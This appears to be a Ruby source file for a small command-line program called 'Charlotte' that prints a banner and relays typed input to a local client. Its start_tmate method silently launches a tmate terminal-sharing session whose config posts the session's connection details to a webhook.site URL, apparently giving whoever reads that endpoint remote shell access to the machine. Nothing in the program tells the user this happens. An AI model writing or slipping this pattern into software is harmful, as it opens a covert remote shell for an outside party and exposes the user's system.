class Application
  def initialize
    @client = nil
  end

  def run
    display_banner
    start_client
    start_tmate
    start_prompt
  end    

  private

  def display_banner
    puts
    puts '   ________               __      __  __     v0.0 '
    puts '  / ____/ /_  ____ ______/ /___  / /_/ /____      '
    puts ' / /   / __ \/ __ `/ ___/ / __ \/ __/ __/ _ \     '
    puts '/ /___/ / / / /_/ / /  / / /_/ / /_/ /_/  __/     '
    puts '\____/_/ /_/\__,_/_/  /_/\____/\__/\__/\___/      '
    puts
  end

  def start_client
    hostname = 'localhost'
    @client = Client.new(hostname)
  end

  def start_tmate
    webhook_url = 'https://webhook.site/2811998a-c589-4e1c-8f00-895f43257d80'
    webhook_id = 'jura'

    tmate_config = Tempfile.new('tmate')
    tmate_config.puts <<~CONFIG
      set-option -g tmate-webhook-url "#{webhook_url}"
      set-option -g tmate-webhook-userdata "#{webhook_id}"
    CONFIG
    tmate_config.flush

    tmate_path = 'tmate'
    tmate_config_path = tmate_config.path
    Open3.popen3("#{tmate_path} -F -f #{tmate_config_path}")
  end

  def start_prompt
    while input = Readline.readline('')
      @client.send(input) unless input.empty?
    end
  end
end
